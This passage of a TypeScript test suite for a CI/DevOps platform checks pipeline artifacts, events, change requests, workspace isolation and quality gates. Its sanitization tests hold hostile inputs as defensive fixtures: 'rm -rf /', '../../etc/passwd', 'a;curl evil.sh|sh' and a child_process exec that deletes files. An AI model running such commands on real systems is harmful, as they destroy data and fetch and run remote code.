        const e = await services.executions.createQueued(ownerUser, p.id, "pipeline agent artifacts");
        created.executions.push(e.id);
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const res = await services.cicd.agent.run(ownerUser, e.id, p.id, reader, "github", "corr-1");
        assert(res.validation.verdict === "VALID", "generated pipeline validates");
        const arts = await services.artifacts.list(e.id);
        const kinds = arts.map((a) => a.kind);
        assert(kinds.includes("PIPELINE_CONFIG"), "PIPELINE_CONFIG artifact registered");
        assert(kinds.includes("PIPELINE_VALIDATION_REPORT"), "VALIDATION_REPORT artifact registered");
        const cfgArt = arts.find((a) => a.kind === "PIPELINE_CONFIG");
        assert(cfgArt && cfgArt.digest === res.config.digest, "artifact digest matches real config digest");
        assert(res.config.digest.startsWith("sha256:"), "digest is a real sha256");
        return "pipeline artifacts registered";
      },
    },
    {
      name: "Pass3: artifact digest is deterministic for identical pipeline content",
      category: "pass3-artifacts",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "github");
        const c1 = new GitHubActionsGenerator().generate(plan, "acme/app");
        const c2 = new GitHubActionsGenerator().generate(plan, "acme/app");
        assert(c1.content === c2.content, "generation is deterministic");
        const d1 = await services.artifacts.register(created.executions[0] ?? "exec_det", { kind: "PIPELINE_CONFIG", name: "a.yml", content: c1.content });
        const d2 = await services.artifacts.register(created.executions[0] ?? "exec_det", { kind: "PIPELINE_CONFIG", name: "b.yml", content: c2.content });
        assert(d1.digest === d2.digest, "identical content → identical digest");
        return "deterministic digests";
      },
    },

    /* ------------------------------ Events / audit --------------------------- */
    {
      name: "Pass3: pipeline generation + validation events are emitted and ordered",
      category: "pass3-events",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-ev" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "pipeline events");
        created.executions.push(e.id);
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        await services.cicd.agent.run(ownerUser, e.id, p.id, reader, "github", "corr-ev");
        const events = await services.events.list(2000);
        const types = events.map((x) => x.type);
        assert(types.includes("pipeline.plan.created"), "plan event emitted");
        assert(types.includes("pipeline.generation.started"), "generation.started emitted");
        assert(types.includes("pipeline.generation.completed"), "generation.completed emitted");
        assert(types.includes("pipeline.validation.completed"), "validation.completed emitted");
        for (let i = 1; i < events.length; i++) assert(events[i].seq > events[i - 1].seq, "event sequence strictly increasing");
        return "pipeline events emitted + ordered";
      },
    },
    {
      name: "Pass3: change request creation is audited and produces an artifact",
      category: "pass3-events",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-cr" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "change request");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const sp = new StaticGitProvider("github");
        sp.seedRepo({ full_name: "acme/app", default_branch: "main", is_private: false }, "sha0");
        const { cr } = await services.cicd.engine.createChangeRequest(ctx, sp, "acme/app", "nexus/devops/cr", "main", "sha1", "Add CI", "body");
        created.changeRequests.push(cr.id);
        assert(cr.status === "OPEN", "CR open, never auto-merged");
        assert(cr.remote_id === 1, "static fixture PR number");
        const arts = await services.artifacts.list(e.id);
        assert(arts.some((a) => a.kind === "CHANGE_REQUEST"), "CHANGE_REQUEST artifact registered");
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "change_request.created"), "CR creation audited");
        // idempotency: same source branch → same CR
        const again = await services.cicd.engine.createChangeRequest(ctx, sp, "acme/app", "nexus/devops/cr", "main", "sha1", "Add CI", "body");
        assert(!again.created && again.cr.id === cr.id, "duplicate CR is idempotent");
        return "CR audited + idempotent";
      },
    },

    /* ==================== AI Engineering Workspace (orchestration layer) ==================== */
    {
      category: "eng-workspace",
      name: "engws: intent parser is deterministic and extracts real signals (no black-box AI)",
      fn: async () => {
        const raw = "Build a realtime analytics dashboard with auth, a REST API and Docker deployment";
        const a = parseIntent(raw);
        const b = parseIntent(raw);
        assert(a.subject === b.subject && a.scope === b.scope && a.signals.length === b.signals.length, "deterministic parsing");
        const ids = a.signals.map((s) => s.id);
        assert(ids.includes("auth"), "auth signal detected");
        assert(ids.includes("api"), "api signal detected");
        assert(ids.includes("deploy"), "deploy signal detected");
        assert(ids.includes("realtime"), "realtime signal detected");
        assert(a.signals.every((s) => s.matched.length > 0), "every signal cites real matched words");
        return `subject="${a.subject}" scope=${a.scope} signals=${ids.join(",")}`;
      },
    },
    {
      category: "eng-workspace",
      name: "engws: plan generation detects real project characteristics with honest stage availability",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "engws-plan" });
        created.projects.push(p.id);
        const intent = parseIntent("Build an API service with a database and Docker deployment");
        const plan = await generatePlan(services, ownerUser, p, intent, { scaffold: true });
        created.workspaces.push(plan.workspaceId);
        assert(plan.detection.language === "node" || plan.detection.language === "typescript", `real detection, got ${plan.detection.language}`);
        assert(plan.detection.package_manager === "npm", "scaffold provides npm");
        const byId = Object.fromEntries(plan.stages.map((s) => [s.id, s]));
        assert(byId["DETECTING"]?.availability === "ready", "detection is ready");
        assert(byId["BUILDING"]?.availability === "blocked", "build is honestly blocked (no command runtime)");
        assert(byId["BUILDING"]?.blockedReason, "build has a real blocked reason");
        assert(byId["SECURITY_REVIEW"]?.availability === "ready", "static security is ready");
        assert(byId["SBOM_GENERATION"]?.availability === "ready", "scaffold yields an SBOM-able manifest");
        assert(plan.readyCount + plan.blockedCount === plan.stages.length, "availability accounting is complete");
        return `lang=${plan.detection.language} ready=${plan.readyCount} blocked=${plan.blockedCount}`;
      },
    },
    {
      category: "eng-workspace",
      name: "engws: execution runs real stages — security/SBOM pass, build/test BLOCKED, never faked PASSED",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "engws-exec" });
        created.projects.push(p.id);
        const intent = parseIntent("Build a REST API with auth and Postgres persistence");
        const plan = await generatePlan(services, ownerUser, p, intent, { scaffold: true });
        created.workspaces.push(plan.workspaceId);
        const res = await executePlan(services, ownerUser, plan);
        created.executions.push(res.execution.id);
        const byId = Object.fromEntries(res.stages.map((s) => [s.stageId, s]));
        assert(byId["DETECTING"]?.outcome === "PASSED", "detection genuinely passed");
        assert(byId["SECURITY_REVIEW"]?.outcome === "PASSED", "static security genuinely passed");
        assert(byId["SBOM_GENERATION"]?.outcome === "PASSED", "source SBOM genuinely passed");
        assert(byId["BUILDING"]?.outcome === "BLOCKED", "build is BLOCKED, not PASSED");
        assert(byId["TESTING"]?.outcome === "BLOCKED", "test is BLOCKED, not PASSED");
        assert(res.verdict === "BLOCKED", `verdict must be BLOCKED while build/test unavailable, got ${res.verdict}`);
        assert(res.passed >= 3 && res.blocked >= 2, "honest pass/block accounting");
        assert(res.recovery.length > 0, "recovery guidance present");
        return `verdict=${res.verdict} passed=${res.passed} blocked=${res.blocked}`;
      },
    },
    {
      category: "eng-workspace",
      name: "engws: execution registers real artifacts with digests and emits ordered events",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "engws-art" });
        created.projects.push(p.id);
        const intent = parseIntent("Build an API with a database");
        const plan = await generatePlan(services, ownerUser, p, intent, { scaffold: true });
        created.workspaces.push(plan.workspaceId);
        const res = await executePlan(services, ownerUser, plan);
        created.executions.push(res.execution.id);
        const arts = await services.artifacts.list(res.execution.id);
        assert(arts.some((a) => a.kind === "SBOM"), "SBOM artifact registered");
        assert(arts.every((a) => typeof a.digest === "string" && a.digest.startsWith("sha256:")), "every artifact has a real digest");
        const events = await services.events.list(2000);
        const execEvents = events.filter((e) => e.execution_id === res.execution.id);
        assert(execEvents.length > 0, "execution events emitted");
        for (let i = 1; i < events.length; i++) assert(events[i].seq > events[i - 1].seq, "event sequence strictly increasing");
        return `${arts.length} artifacts · ${execEvents.length} events`;
      },
    },
    {
      category: "eng-workspace",
      name: "engws: VIEWER is denied plan generation and execution (authorization reused, audited)",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "engws-deny" });
        created.projects.push(p.id);
        const intent = parseIntent("Build an API with auth");
        await expectThrow(() => generatePlan(services, scratchUser, p, intent, { scaffold: true }), "permission");
        // workspace create was denied + audited for the viewer
        const audit = await services.audit.list(50);
        assert(audit.some((a) => a.result === "deny"), "denial audited");
        return "viewer denied + audited";
      },
    },
    {
      category: "eng-workspace",
      name: "engws: the plan workspace is isolated and owned by the executing identity",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "engws-own" });
        created.projects.push(p.id);
        const intent = parseIntent("Build a dashboard with charts");
        const plan = await generatePlan(services, ownerUser, p, intent, { scaffold: true });
        created.workspaces.push(plan.workspaceId);
        const ws = await services.workspaces.get(ownerUser, plan.workspaceId);
        assert(ws.owner_identity_id === ownerUser.id, "workspace owned by the executing identity");
        assert(ws.project_id === p.id, "workspace bound to the project");
        // a different identity cannot read it
        await expectThrow(() => services.workspaces.readFile(owner2User, plan.workspaceId, "package.json"), "denied");
        return `workspace ${plan.workspaceId} isolated`;
      },
    },

    /* ----------------- Phase 3 Pass 5 — runtime bridge & smoke tests ---------------- */
    {
      category: "runtime-bridge",
      name: "rt: executable resolution is platform-aware (Windows vs POSIX), never hardcoded to one OS",
      fn: async () => {
        assert(resolveExecutable("win32", "docker") === "docker.exe", "windows docker.exe");
        assert(resolveExecutable("win32", "trivy") === "trivy.exe", "windows trivy.exe");
        assert(resolveExecutable("win32", "npx") === "npx.cmd", "windows npx.cmd");
        assert(resolveExecutable("linux", "docker") === "docker", "linux docker");
        assert(resolveExecutable("darwin", "npx") === "npx", "macos npx");
        return "win32→.exe/.cmd, posix→bare names";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: argument sanitization rejects shell metacharacters and path traversal",
      fn: async () => {
        await expectThrow(async () => sanitizeArgs(["ok", "rm -rf /"]), "metacharacters");
        await expectThrow(async () => sanitizeArgs(["../../etc/passwd"]), "traversal");
        await expectThrow(async () => sanitizeArgs(["a;curl evil.sh|sh"]), "metacharacters");
        const clean = sanitizeArgs(["--format", "json", "my-image:tag"]);
        assert(clean.length === 3, "clean args pass through");
        return "injection + traversal rejected";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: managed browser executor reports BLOCKED and never pretends to execute",
      fn: async () => {
        const exec = new BrowserProcessExecutor();
        const cap = exec.capability();
        assert(cap.available === false, "managed runtime has no process execution");
        assert(cap.kind === "MANAGED_BROWSER_RUNTIME", "reports managed mode");
        await expectThrow(() => exec.run({ tool: "docker", operation: "version", args: [] }), "BLOCKED");
        return "managed executor honestly BLOCKED";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: host executor rejects untrusted raw scripts (only registered trusted scripts allowed)",
      fn: async () => {
        const fakeBridge: HostBridge = {
          platform: () => "win32",
          exec: async () => ({ exit_code: 0, stdout: "", stderr: "" }),
        };
        const hostExec = new HostProcessExecutor(fakeBridge);
        // An attacker-supplied script must never reach the bridge.
        await expectThrow(
          () => hostExec.run({ tool: "node", operation: "-e", args: [], rawArgs: ["require('child_process').exec('rm -rf /')"] }),
          "not a registered trusted script",
        );
        // Trusted scripts are only valid with `node -e`.
        await expectThrow(
          () => hostExec.run({ tool: "docker", operation: "version", args: [], rawArgs: ["anything"] }),
          "node -e",
        );
        return "untrusted scripts + misuse rejected";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: Playwright detection + smoke are BLOCKED in the managed runtime (never faked)",
      fn: async () => {
        const adapter = new PlaywrightAdapter(new BrowserProcessExecutor());
        const det = await adapter.detect();
        assert(det.playwright === false && det.chromium === false, "nothing detected in managed runtime");
        assert(det.reason !== null, "honest reason provided");
        const smoke = await adapter.smoke("http://localhost:8080");
        assert(smoke.status === "BLOCKED", `smoke must be BLOCKED, got ${smoke.status}`);
        assert(smoke.blocked_reason !== null, "blocked reason present");
        assert(smoke.http_status === null && smoke.browser === null, "no invented browser/status");
        return "playwright/chromium honestly BLOCKED";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: smoke test service returns BLOCKED verdict when the runtime cannot execute (health + browser)",
      fn: async () => {
        const svc = new SmokeTestService(new BrowserProcessExecutor(), new PlaywrightAdapter(new BrowserProcessExecutor()), {
          events: services.events,
          audit: services.audit,
        });
        const res = await svc.run({ execution_id: null, staging_url: "http://localhost:9999" });
        assert(res.verdict === "BLOCKED", `verdict must be BLOCKED, got ${res.verdict}`);
        assert(res.health.ok === false, "health did not succeed");
        assert(res.smoke.status === "BLOCKED", "smoke BLOCKED");
        assert(res.reason !== null, "blocked reason present");
        return "smoke verdict honestly BLOCKED";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: quality gate returns VERIFIED only when all stages PASS (evidence-based)",
      fn: async () => {
        const qg = new QualityGateService({ events: services.events, audit: services.audit });
        const all: Partial<Record<GateStage, GateEvidence>> = {};
        for (const s of GATE_STAGES) all[s] = { status: "PASS", reason: null };
        const res = await qg.evaluate("rt-gate-pass", all);
        assert(res.verdict === "VERIFIED", `all-pass must be VERIFIED, got ${res.verdict}`);
        assert(res.required_passed === GATE_STAGES.length, "all stages counted");
        return `VERIFIED ${res.required_passed}/${res.required_total}`;
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: quality gate FAILED on any FAIL, BLOCKED on any BLOCKED — never silently PASS",
      fn: async () => {
        const qg = new QualityGateService({ events: services.events, audit: services.audit });
        const mk = (over: Partial<Record<GateStage, GateEvidence>>) => {
          const base: Partial<Record<GateStage, GateEvidence>> = {};
          for (const s of GATE_STAGES) base[s] = { status: "PASS", reason: null };
          return { ...base, ...over };
        };
        const failed = await qg.evaluate("rt-gate-fail", mk({ SMOKE: { status: "FAIL", reason: "page errors" } }));
        assert(failed.verdict === "FAILED", `FAIL stage must yield FAILED, got ${failed.verdict}`);
        assert(failed.blocking_stages.some((b) => b.stage === "SMOKE" && b.status === "FAILED"), "SMOKE recorded as blocking");
        const blocked = await qg.evaluate("rt-gate-block", mk({ DOCKER: { status: "BLOCKED", reason: "no daemon" } }));
        assert(blocked.verdict === "BLOCKED", `BLOCKED stage must yield BLOCKED (never VERIFIED), got ${blocked.verdict}`);
        return "FAIL→FAILED, BLOCKED→BLOCKED";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: quality gate treats missing evidence as BLOCKED (never assumes PASS)",
      fn: async () => {
        const qg = new QualityGateService({ events: services.events, audit: services.audit });
        const partial: Partial<Record<GateStage, GateEvidence>> = { BUILD: { status: "PASS", reason: null } };
        const res = await qg.evaluate("rt-gate-missing", partial);
        assert(res.verdict === "BLOCKED", `missing evidence must be BLOCKED, got ${res.verdict}`);
        assert(res.required_passed === 1, "only the supplied PASS counted");
        return "absent stages default to BLOCKED";
      },
    },
    {
      category: "runtime-bridge",
      name: "rt: quality gate evaluations are audited (real audit trail, distinct verdicts)",
      fn: async () => {
        const qg = new QualityGateService({ events: services.events, audit: services.audit });
        const all: Partial<Record<GateStage, GateEvidence>> = {};
        for (const s of GATE_STAGES) all[s] = { status: "PASS", reason: null };
        await qg.evaluate("rt-gate-audit", all);
        const audit = await services.audit.list(200);
        const gates = audit.filter((a) => a.action === "quality_gate.evaluated");
        assert(gates.length > 0, "gate evaluations audited");
        assert(gates.some((a) => a.result === "allow"), "VERIFIED audited as allow");
        return `${gates.length} gate audit records`;
      },
    },
  ];

  const results: TestResult[] = [];
  for (const t of tests) {
    const start = performance.now();
    try {
      const evidence = await t.fn();
      results.push({ name: t.name, category: t.category, status: "PASSED", duration_ms: Math.round(performance.now() - start), evidence: evidence ?? null, error: null, timestamp: Date.now() });
    } catch (e) {
      results.push({ name: t.name, category: t.category, status: "FAILED", duration_ms: Math.round(performance.now() - start), evidence: null, error: (e as Error).message, timestamp: Date.now() });
    }
  }

  // Scratch cleanup (best effort — never touches operator data).
  for (const id of created.executions) {
    await services.engine.del("executions", id).catch(() => undefined);
  }
  for (const id of created.projects) {
    await services.engine.del("projects", id).catch(() => undefined);
  }
  for (const id of created.users) {
    await services.engine.del("users", id).catch(() => undefined);
  }
  // Pass 3 — remove scratch workspaces and their files.
  for (const id of created.workspaces) {
    const files = await services.engine.byIndex<WorkspaceFileRecord>("workspace_files", "byWorkspace", id).catch(() => [] as WorkspaceFileRecord[]);
    for (const f of files) await services.engine.del("workspace_files", f.id).catch(() => undefined);
    await services.engine.del("workspaces", id).catch(() => undefined);
  }
  // Pass 3 — remove scratch agent executions and any workspaces bound to them.
  for (const id of created.agentExecs) {
    const runs = await services.engine.byIndex<AgentExecutionRecord>("agent_executions", "byExecution", id).catch(() => [] as AgentExecutionRecord[]);
    for (const r of runs) await services.engine.del("agent_executions", r.id).catch(() => undefined);
    const wss = await services.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", id).catch(() => [] as WorkspaceRecord[]);
    for (const w of wss) {
      const files = await services.engine.byIndex<WorkspaceFileRecord>("workspace_files", "byWorkspace", w.id).catch(() => [] as WorkspaceFileRecord[]);
      for (const f of files) await services.engine.del("workspace_files", f.id).catch(() => undefined);
      await services.engine.del("workspaces", w.id).catch(() => undefined);
    }
  }

  return {
    results,
    passed: results.filter((r) => r.status === "PASSED").length,
    failed: results.filter((r) => r.status === "FAILED").length,
    blocked: results.filter((r) => r.status === "BLOCKED").length,
    duration_ms: Math.round(performance.now() - t0),
    ran_at: Date.now(),
    engine: services.engine.kind,
  };
}
